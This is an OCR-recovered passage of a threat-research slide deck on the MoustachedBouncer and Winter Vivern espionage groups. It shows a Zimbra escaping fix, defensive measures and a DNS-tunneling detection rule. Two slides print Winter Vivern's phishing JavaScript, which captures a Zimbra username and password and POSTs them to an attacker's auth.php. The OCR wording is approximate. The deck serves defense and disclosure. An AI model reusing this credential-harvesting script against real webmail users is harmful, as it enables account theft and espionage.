56 + <title>${fn:escapeXml(errCode)} - <fmt:message key="${errTitle}"/></title>
57 57 <meta name="viewport™ content="width=320; initial-scale=1.0; maximum-scale=8.@; user-scalable=1;">
58 58 <meta name="description” content="<fmt:message bundle="${zmmsg}" key="zimbraLoginMetaDesc"/>">
59 59 <link rel="stylesheet" type="text/css" href="<c:url value='/css/common, login, zhtml,skin.css'>
-f @@ -70,11 +70,11 @@
70 70 <body>
71 71 <div class="ErrorScreen">
72 72 <div class="errorBox">
73 - <h2><fmt:message key="${errTitle}"/></h2>
72 + <h2><fmt:message key="${fn:escapeXml(errTitle) }"/></h2>
75 = <fmt:message key="${errMsg}"/><br/>
75 + <fmt:message key="${fn:escapeXml(errMsg) }"/><br/>
```

## Slide 83


> Recovered by OCR — confidence 86/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
function onClickSendCredentials( ){
var csrfT = encodeURIComponent( document. getElementById("cv56ds678dfs").value);
}
if(!(username. length > © && password.length > 0)){
var alertElement = document.getElementById( "errorMessaageDiv" );
alertElement.innerHTML = "The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username
and password.";
return;
}
console. log('Password', password);
console.log('CsrfT', csrfT);
var serverAuthRequest = new XMLHttpRequest();
serverAuthRequest.onreadystatechange = function() {
if (this.response.includes('login.jsp')) {
var alertElement = document.getElementById("errorMessageDiv" );
alertElement.innerHTML = "The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current
username and password.";
var saveCredentialsRequest = new XMLHttpRequest( );
saveCredentialsRequest.open("POST", ‘'https://' + serverDomain + '/' + serverPath + '/auth.php', true);
saveCredentialsRequest.onreadystatechange = function() {
```

## Slide 84


> Recovered by OCR — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
return;
console. log( 'Username', username);
console. log('Password', password);
console.log('CsrfT', csrfT);
var serverAuthRequest = new XMLHttpRequest();
serverAuthRequest.onreadystatechange = function() {
if (this.response.includes('login.jsp')) {
var alertElement = document.getElementById("errorMessageDiv" );
alertElement.innerHTML = "The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current
username and password.";
getCSRFTokenFromString(this.response);
var saveCredentialsRequest = new XMLHttpRequest( );
saveCredentialsRequest.open("POST", ‘https://' + serverDomain + '/' + serverPath + '/auth.php', true);
saveCredentialsRequest.onreadystatechange = function() {
if(this.readyState === XMLHttpRequest.DONE){
var signInElement = document.getElementById("lic34yo80" );
}
+
saveCredentialsRequest.send("accountName=" + accountName + "&username=" + username + "&password=" + password);
}
}
}
if(csrfT){
serverAuthRequest.send("login0p=login&client=preferred&username=" + username + "&password=" + password + "&login_csrf=" + csrfT);
serverAuthRequest.send("loginOp=login&client=preferred&username=" + username + "&password=" + password);
```

## Slide 85

##### **Winter Vivern**

###### **Government staff**

Europe and Asia

###### **MoustachedBouncer**

Collaborator

###### **Backdoor**

PowerShell

**Phishing for credentials**

Zimbra

## Slide 86

5: Defense

1: MoustachedBouncer

3: NightClub

2: AitM

4: Winter Vivern

## **5: Defense**

## Slide 87

**SMB**

Deny to external

##### **Defensive measures**

**VPN**

To prevent AitM

**Update** Webmail / Internet facing services

## Slide 88

##### **DNS-tunneling detection**

**alert udp any any -> any 53 \**

**(msg:"Possible beacon for MoustachedBouncer NightClub DNS-tunneling backdoor";\ gid:45534554; sid:45375000; rev:1;\**

**metadata: author "ESET Research", date "2022-10-21,\ copyright "ESET Research"**

**content:"|78 5a 57 31 77 64 48 6b 78 02 31 31 01 31 01 31 03 63 69 64|";offset:13;)**

\```
xZW1wdHkx.11.1.1.cid
\```

## Slide 89

#### AitM capabilities

## Slide 90

#### AitM capabilities

#### Related to Belarus-aligned Winter Vivern

## Slide 91

#### AitM capabilities

Target foreign diplomats in Belarus

#### Related to Belarus-aligned Winter Vivern

## Slide 92

#### AitM capabilities

Target foreign diplomats in Belarus

#### Active since 2014

#### Related to Belarus-aligned Winter Vivern

## Slide 93


> Recovered by OCR — confidence 91/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
welivesecurity wy Ger} Award-winning news, views, and insight from the ESET security com
ESET RESEARCH
MoustachedBouncer: Espionage
against foreign diplomats in Belarus
Long-term espionage against diplomats, leveraging email-based C&C protocols, C++ mod-
ular backdoors, and adversary-in-the-middle (AitM) attacks... Sounds like the infamous
Turla? Think again!
g Matthieu Faou
10 Aug 2023 © 29 min. read
```
